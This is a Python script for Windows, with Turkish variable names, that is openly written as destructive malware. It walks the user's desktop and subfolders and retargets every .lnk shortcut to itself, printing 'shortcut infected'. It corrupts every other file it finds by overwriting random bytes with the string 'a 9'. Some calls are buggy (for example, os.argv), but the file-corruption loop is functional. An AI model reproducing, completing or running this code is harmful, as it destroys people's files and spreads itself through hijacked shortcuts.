from win32com.shell import shell, shellcon
import os
from random import randint
from sys import argv
import __main__ as main
masaustu = shell.SHGetFolderPath (0, shellcon.CSIDL_DESKTOP, 0, 0)
masaustu = masaustu
dosyalar = os.listdir(masaustu)
import os, sys
import pythoncom
from win32com.shell import shell, shellcon
print os.listdir(os.getcwd())
def short_target(filename,dest):
    shortcut = pythoncom.CoCreateInstance (
        shell.CLSID_ShellLink,
        None,
        pythoncom.CLSCTX_INPROC_SERVER,
        shell.IID_IShellLink
    )
    desktop_path = shell.SHGetFolderPath (0, shellcon.CSIDL_DESKTOP, 0, 0)
    shortcut_path = os.path.join (desktop_path, filename)
    persist_file = shortcut.QueryInterface (pythoncom.IID_IPersistFile)
    persist_file.Load (shortcut_path)
    shortcut.SetPath(dest)
    mydocs_path = shell.SHGetFolderPath (0, shellcon.CSIDL_PERSONAL, 0, 0)
    shortcut.SetWorkingDirectory (mydocs_path)
    persist_file.Save (shortcut_path, 0)


klasor = []
xa = -1
while 1:
    for dosya in dosyalar:
        gdosya = masaustu+"\\"+dosya
        if os.path.isdir(gdosya):
            klasor.append(gdosya)
        else:
            if dosya.endswith(".lnk"):
                print gdosya
                try:
                    short_target(gdosya,os.argv[0])
                    print"shortcut infected"
                except:
                    pass
            else:

                try:
                    with open(gdosya,"rb") as ac:
                        veri = ac.read()
                        ac.write("test")
                except:
                    pass
                print gdosya
                try:
                    with open(gdosya,"wb") as yaz:
                        veri = list(veri)
                        d = 0
                        while d <60:
                            i = randint(0,len(veri))
                            try:
                                veri[i] = "a 9"
                            except:
                                print "hata"
                            d = d+1
                        try:
                            yaz.write("".join((veri)))
                        except:
                            print "hata"
                except:
                    print "hata"
    xa = xa +1
    if len(klasor) == 0:
        break
    else:
        try:
            masaustu = klasor[xa]
            dosyalar = os.listdir(masaustu)
        except:
            break

                
